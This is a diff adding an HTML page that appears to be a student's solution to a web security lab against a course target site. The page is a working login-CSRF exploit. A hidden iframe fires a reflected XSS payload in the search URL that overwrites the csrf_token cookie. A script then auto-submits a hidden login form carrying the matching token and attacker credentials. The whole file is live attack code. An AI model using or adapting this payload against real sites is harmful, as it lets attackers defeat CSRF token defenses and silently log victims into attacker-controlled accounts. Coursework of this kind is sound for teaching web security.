@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta charset="utf-8">
+<title>Hat trick</title>
+</head>
+<body>
+	<form method="POST" name="transfer" action="http://bungle-cs461.cs.illinois.edu/login">
+	<input type="hidden" name="csrfdefense" value="1"/>
+	<input type="hidden" name="xssdefense" value="0"/>
+	<input type="hidden" name="username" value="attacker"/>
+	<input type="hidden" name="password" value="l33th4x"/>
+	<input type="hidden" name="csrf_token" value="453ff93453492c70ffced082e867c6f9"/>
+	</form>
+	<iframe name="iiframe" onload="steal()" style="display:none" src="http://bungle-cs461.cs.illinois.edu/search?csrfdefense=1&xssdefense=0&q=%3Cscript%3Edocument.cookie=%27csrf_token=453ff93453492c70ffced082e867c6f9%27%3C/script%3E"></iframe>
+	<script type="text/javascript">	
+	function steal(){
+	document.transfer.submit();
+	}</script>
+</body>
+
